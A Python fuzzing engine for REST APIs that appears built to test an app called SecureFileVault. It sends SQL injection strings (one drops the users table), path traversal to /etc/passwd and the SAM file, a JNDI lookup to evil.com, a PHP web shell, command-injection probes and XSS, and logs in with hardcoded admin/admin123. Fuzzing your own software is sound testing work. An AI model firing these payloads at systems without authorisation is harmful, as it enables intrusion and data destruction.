"""
SENTIO / Fragilis — Fuzzing Engine
Proactively discovers vulnerabilities by sending malformed inputs
to target API endpoints and analyzing responses.
"""
import uuid
import time
import random
import string
import requests
from datetime import datetime
from typing import List, Dict, Any, Optional, Callable
from utils.logger import get_logger
from models.fuzz_models import FuzzPayload, FuzzResult, FuzzCampaign

logger = get_logger("fuzzer")


class FuzzerEngine:
    """
    Multi-strategy fuzzing engine for REST APIs.
    """

    def __init__(self, target_url: str, timeout: float = 10.0):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "SENTIO-Fuzzer/1.0",
            "Accept": "application/json",
        })
        self._auth_token: Optional[str] = None

    def authenticate(self, username: str = "admin", password: str = "admin123") -> bool:
        """Obtain a valid JWT token for authenticated fuzzing."""
        try:
            resp = self.session.post(
                f"{self.target_url}/api/auth/login",
                json={"username": username, "password": password},
                timeout=self.timeout
            )
            if resp.status_code == 200:
                self._auth_token = resp.json().get("access_token")
                self.session.headers.update({"Authorization": f"Bearer {self._auth_token}"})
                logger.info(f"Fuzzer authenticated as {username}")
                return True
        except Exception as e:
            logger.warning(f"Authentication failed: {e}")
        return False

    def _generate_boundary_values(self, base_value: str) -> List[Any]:
        """Generate boundary test values."""
        return [
            "",                                    # Empty
            "a",                                   # Minimum length
            "a" * 255,                             # Common buffer boundary
            "a" * 1024,                            # 1KB
            "a" * 10240,                           # 10KB
            "a" * 102400,                          # 100KB
            "a" * 1048576,                         # 1MB
            "0", "-1", "99999999999999999999",     # Numeric extremes
            "null", "None", "undefined", "true", "false",
        ]

    def _generate_format_strings(self) -> List[str]:
        """Format string attack payloads."""
        return [
            "%s", "%s%s%s", "%n", "%x", "%p",
            "{}" * 100, "{}", "{{}}", "${jndi:ldap://evil.com}",
        ]

    def _generate_sql_injections(self) -> List[str]:
        """SQL injection probe payloads."""
        return [
            "' OR '1'='1", "' OR '1'='1' --", "'; DROP TABLE users; --",
            "1; SELECT * FROM users", "' UNION SELECT * FROM users --",
            "\"", "\';", "\x27", "\x22", "\x00",
        ]

    def _generate_path_traversal(self) -> List[str]:
        """Path traversal payloads."""
        return [
            "../../../etc/passwd", "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f", "%252e%252e%252f", "....////....////etc/passwd",
        ]

    def _generate_special_chars(self) -> List[str]:
        """Characters that commonly break parsers."""
        chars = [
            "\x00", "\x01", "\xff", "\xfe",
            "<script>alert(1)</script>",
            "<?php system($_GET['cmd']); ?>",
            "`whoami`", "$(whoami)", "| whoami", "; whoami",
            "\u0000", "\u202e", "\x80", "\xbf",
            "🙂" * 1000,                              # Unicode flood
            "\r\n" * 50,                           # Header injection
        ]
        return chars

    def _generate_random_garbage(self, count: int = 10) -> List[str]:
        """Purely random payloads."""
        payloads = []
        for _ in range(count):
            length = random.choice([1, 10, 100, 1000, 5000, 20000])
            p = "".join(random.choices(
                string.ascii_letters + string.digits + string.punctuation + "\x00\x01\xff",
                k=length
            ))
            payloads.append(p)
        return payloads

    def _generate_json_mutation(self, base: dict) -> List[dict]:
        """Mutate a JSON structure with dangerous values."""
        mutations = []
        dangerous = self._generate_boundary_values("") + self._generate_format_strings() + self._generate_sql_injections()
        for key in base:
            for d in dangerous[:5]:  # Limit per key
                m = dict(base)
                m[key] = d
                mutations.append(m)
        # Deep nesting attack
        nested = {"a": {"b": {"c": {"d": {"e": "deep"}}}}}
        for _ in range(50):
            nested = {"layer": nested}
        mutations.append(nested)
        return mutations

    def _send_payload(self, method: str, endpoint: str, data: Any, files: Any = None) -> FuzzResult:
        """Send one payload and record the result."""
        url = f"{self.target_url}{endpoint}"
        start = time.time()
        status = 0
        resp_size = 0
        preview = ""
        crash = False
        hang = False
        error = False
        unusual = False
        details = ""

        try:
            if method == "GET":
                resp = self.session.get(url, params=data if isinstance(data, dict) else None, timeout=self.timeout)
            elif method == "POST":
                if files:
                    resp = self.session.post(url, files=files, data=data, timeout=self.timeout)
                else:
                    resp = self.session.post(url, json=data if isinstance(data, dict) else None, data=data if not isinstance(data, dict) else None, timeout=self.timeout)
            elif method == "PUT":
                resp = self.session.put(url, json=data, timeout=self.timeout)
            elif method == "DELETE":
                resp = self.session.delete(url, timeout=self.timeout)
            else:
                resp = self.session.request(method, url, json=data, timeout=self.timeout)

            status = resp.status_code
            resp_size = len(resp.content)
            preview = resp.text[:200].replace("\n", " ")

            # Detect unusual behavior
            if status == 500:
                error = True
                details = "Server returned HTTP 500 — possible unhandled exception"
            elif status not in (200, 201, 400, 401, 403, 404, 422, 429):
                unusual = True
                details = f"Unexpected status code {status}"

        except requests.exceptions.Timeout:
            hang = True
            status = 598
            details = f"Request timed out after {self.timeout}s — possible hang/DoS"
        except requests.exceptions.ConnectionError:
            crash = True
            status = 599
            details = "Connection refused/reset — possible crash"
        except Exception as e:
            crash = True
            status = 599
            details = f"Exception: {str(e)}"

        duration = (time.time() - start) * 1000

        # Severity scoring
        severity = "info"
        if crash:
            severity = "critical"
        elif hang:
            severity = "high"
        elif error:
            severity = "high"
        elif unusual:
            severity = "medium"

        return FuzzResult(
            result_id=str(uuid.uuid4())[:8],
            payload_id="",
            endpoint=endpoint,
            method=method,
            status_code=status,
            response_time_ms=round(duration, 2),
            response_size=resp_size,
            response_preview=preview,
            crash_detected=crash,
            hang_detected=hang,
            error_detected=error,
            unusual_behavior=unusual,
            severity=severity,
            details=details,
            timestamp=datetime.utcnow().isoformat(),
        )

    def run_campaign(self, max_payloads: int = 100) -> FuzzCampaign:
        """
        Execute a full fuzzing campaign against SecureFileVault.
        """
        campaign = FuzzCampaign(
            campaign_id=str(uuid.uuid4())[:8],
            target_url=self.target_url,
            started_at=datetime.utcnow().isoformat(),
        )

        # Ensure authentication for protected endpoints
        has_auth = self.authenticate()

        # Define target endpoints and their base payloads
        targets = [
            {"endpoint": "/api/auth/register", "method": "POST", "base": {"username": "fuzz", "password": "fuzz123"}, "auth": False},
            {"endpoint": "/api/auth/login", "method": "POST", "base": {"username": "admin", "password": "admin123"}, "auth": False},
            {"endpoint": "/api/search", "method": "POST", "base": {"q": "test", "scope": "files"}, "auth": True},
        ]

        payload_count = 0

        for target in targets:
            if target["auth"] and not has_auth:
                logger.warning(f"Skipping {target['endpoint']} — no auth token")
                continue

            endpoint = target["endpoint"]
            method = target["method"]
            base = target["base"]

            strategies = [
                ("boundary", self._generate_boundary_values("")),
                ("format_string", self._generate_format_strings()),
                ("sql_inject", self._generate_sql_injections()),
                ("path_traversal", self._generate_path_traversal()),
                ("special_chars", self._generate_special_chars()),
                ("random_garbage", self._generate_random_garbage(5)),
            ]

            for strategy_name, payloads in strategies:
                for payload in payloads:
                    if payload_count >= max_payloads:
                        break

                    # Build request data
                    if isinstance(base, dict):
                        # Replace one field with payload, or use payload as entire body
                        if isinstance(payload, dict):
                            data = payload
                        else:
                            data = dict(base)
                            key = random.choice(list(data.keys()))
                            data[key] = payload
                    else:
                        data = payload

                    result = self._send_payload(method, endpoint, data)
                    result.payload_id = f"{strategy_name}_{payload_count}"
                    campaign.results.append(result)
                    payload_count += 1

                    if result.crash_detected:
                        campaign.crashes += 1
                        logger.critical(f"CRASH on {endpoint} with {strategy_name}: {payload[:50]}")
                    elif result.hang_detected:
                        campaign.hangs += 1
                        logger.warning(f"HANG on {endpoint} with {strategy_name}")
                    elif result.error_detected:
                        campaign.errors += 1
                        logger.warning(f"ERROR on {endpoint} with {strategy_name}: {result.status_code}")
                    elif result.unusual_behavior:
                        campaign.unusual += 1

                if payload_count >= max_payloads:
                    break

            # JSON mutations for POST endpoints
            if method == "POST" and isinstance(base, dict) and payload_count < max_payloads:
                mutations = self._generate_json_mutation(base)
                for mutation in mutations[:10]:
                    if payload_count >= max_payloads:
                        break
                    result = self._send_payload(method, endpoint, mutation)
                    result.payload_id = f"json_mutate_{payload_count}"
                    campaign.results.append(result)
                    payload_count += 1

        campaign.ended_at = datetime.utcnow().isoformat()
        campaign.total_payloads = payload_count
        logger.info(f"Campaign {campaign.campaign_id} complete: {payload_count} payloads, {campaign.crashes} crashes, {campaign.hangs} hangs, {campaign.errors} errors")
        return campaign
